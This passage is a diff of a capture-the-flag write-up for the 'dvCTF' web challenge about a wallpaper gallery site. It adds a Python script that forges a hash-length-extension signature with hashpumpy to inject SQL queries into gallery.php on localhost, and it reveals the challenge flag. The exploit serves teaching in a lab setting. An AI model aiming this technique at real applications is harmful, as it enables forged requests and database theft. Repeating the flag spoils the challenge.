@@ -4,7 +4,7 @@
 > 
 > Category : web
 > 
-> Difficulty : easy
+> Difficulty : medium
 > 
 > Description : I love this website ! It allows me to store all my wallpapers online, so cool !
 >
@@ -64,10 +64,20 @@ import warnings
 import base64
 
 warnings.filterwarnings("ignore", category=DeprecationWarning)
-url = "http://localhost:113377/gallery.php"
+url = "http://localhost:11337/gallery.php"
 b64_req = base64.b64encode(b"select 1;")
 
 hash,payload = hashpumpy.hashpump("8fc8cee62b7d63c442c0d331346c3ec9",'',b64_req,26)
 r = requests.post(url,data={"images":payload+b"|"+hash.encode()})
 print(r.text)
+```
+
+By modifying a bit this script to get the tables names and then the columns, we can get the final script to get the flag : 
+```py
+b64_req = base64.b64encode(b"select * from sup3r53cretd4t4;")
+```
+```html
+<div class="images">
+                        <img src="" alt="dvCTF{h4sh_l3ngth_3xt3ns1on_1s_funny}" title="dvCTF{h4sh_l3ngth_3xt3ns1on_1s_funny}" />
+            </div>
 ```
